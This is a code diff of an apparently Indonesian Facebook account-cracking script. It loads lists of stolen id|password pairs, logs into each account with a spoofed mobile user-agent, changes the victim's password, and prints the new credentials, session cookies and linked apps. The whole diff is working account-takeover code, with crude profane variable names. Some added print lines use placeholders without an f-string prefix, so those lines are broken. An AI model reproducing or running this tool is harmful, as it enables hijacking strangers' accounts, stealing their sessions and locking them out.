@@ -394,44 +394,46 @@ def cekhasil():
 ####CHECK OPSI CEKPOINT####
 def cekopsi():
 	dirs = os.listdir("CP")
-	print("")
+	print('──────────────────────────────────────────')
 	for file in dirs:
-		print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] CP/"+file)
-	print("\n \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] masukan file (ex: CP/%s.txt)"%(tanggal))
-	files = raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mnama file  \x1b[1;97m: \x1b[1;92m")
+		print(" [*] CP/"+file)
+	print('──────────────────────────────────────────')
+	files = input(" [?] file  : ")
 	if files == "":
 		menu()
 	try:
 		buka_baju = open(files, "r").readlines()
 	except IOError:
-		exit("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] nama file %s tidak tersedia"%(files))
+		exit("\n [!] nama file %s tidak tersedia"%(files))
 	ubahpw()
-	print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses cek')
+	print('\n [!] anda bisa mematikan data selular untuk menjeda proses cek')
+	print('──────────────────────────────────────────')
 	for memek in buka_baju:
 		kontol = memek.replace("\n","")
 		titid  = kontol.split("|")
-		print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
+		print(" [+] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
 		try:
-			cek_opsi(titid[0].replace("  [CP] ",""), titid[1])
+			cek_opsi(titid[0].replace("  * --> ",""), titid[1])
 		except requests.exceptions.ConnectionError:
 			pass
-	print("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mcek akun sudah selesai\x1b[1;97m...")
-	raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mtekan enter untuk kembali ke menu ")
+		print('──────────────────────────────────────────')
+	print("\n [!] cek akun sudah selesai...")
+	input(" [*] tekan enter untuk kembali ke menu ")
 	time.sleep(1)
 	menu()
 
 def ubahpw():
-	pw=raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mapakah anda ingin mengubah sandi tap yes\x1b[1;97m?\x1b[1;92m[\x1b[1;93mY\x1b[1;97m/\x1b[1;93mt\x1b[1;92m]\x1b[1;97m: \x1b[1;92m")
+	print('──────────────────────────────────────────')
+	pw=input(" [?] ubah sandi tap yes?[Y/t]: ")
 	if pw == "Y" or pw == "y":
 		ubahP.append("y")
-		pw2=raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan sandi \x1b[1;97m: \x1b[1;92m")
+		pw2=input(" [?] masukan sandi : ")
 		if len(pw2) <= 5:
-			exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mkata sandi minimal 6 karakter ")
+			exit(" [!] kata sandi minimal 6 karakter ")
 		else:
 			pwbaru.append(pw2)
 	else:
 		pass
-
 
 def cek_opsi(user,pw):
 	global loop,ubahP,pwbaru
@@ -442,7 +444,7 @@ def cek_opsi(user,pw):
 		"accept-encoding":"gzip, deflate",
 		"accept-language":"id-ID,id;q=0.9",
 		"referer":"https://mbasic.facebook.com/",
-		"user-agent":"nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
+		"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
 	})
 	soup=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
 	link=soup.find("form",{"method":"post"})
@@ -502,7 +504,7 @@ def cek_opsi(user,pw):
 		print(" [!] %s"%(oh))
 	else:
 		loop+=1
-		print(" [!] Account terkena CheckPoint/Terkena Sesi ")
+		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")
 
 def ubah_pw(user,pw,session,response,link2):
 	dat,dat2={},{}
@@ -522,18 +524,40 @@ def ubah_pw(user,pw,session,response,link2):
 		an=session.post(url+link3.get("action"),data=dat2)
 		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 		print("\r [✓] akun tap yes, silahkan login di fb lite \n [*] sandi telah diubah ke : %s \n %s[✓] %s|%s|%s%s									\n"%(pwbaru[0],H,user,pwbaru[0],coki,N))
-		cek_game(coki)
-
-def cek_game(cookie):
-	w=s.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=cookie).text
-	sop = parser(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print("")
+		cek_apk(coki)
+		
+def cek_apk(coki):
+	hit1, hit2 = 0,0
+	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
+		print("{P}[+] Apk yang terkait:")
+		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
+			print("  {N}[+] Apk Aktif :")
+			print("   [!] Ops! Tidak ada aplikasi aktif yang terkait di akun.")
+		else:
+			print("  {N}[+] Apk Aktif :")
+			apkAktif = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek))
+			ditambahkan = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek))
+			for muncul in apkAktif:
+				hit1+=1
+				print("   [{H}{hit1}{N}]. {N}{muncul} -> {H}{ditambahkan[hit2]}{N}")
+				hit2+=1
+		if "Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau." in cek2:
+			print("  {N}[+] Apk kadaluarsa :")
+			print("   [!] Ops! Tidak ada aplikasi kadaluarsa yang terkait diakun.")
+		else:
+			hit1,hit2=0,0
+			print("  {N}[+] Apk kadaluarsa :")
+			apkKadaluarsa = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek2))
+			kadaluarsa = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek2))
+			for muncul in apkKadaluarsa:
+				hit1+=1
+				print("   [{H}{hit1}{N}]. {N}{muncul} -> {M}{kadaluarsa[hit2]}{N}")
+				hit2+=1
 	else:
-		for i in range(len(game)):
-			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada",""),N))
+		print('\n %s[!] cookies anda kadaluwarsa%s'%(M,N));waktu(1)
+	print("")
 
 ###GANTI USER AGENT###
 def useragent():
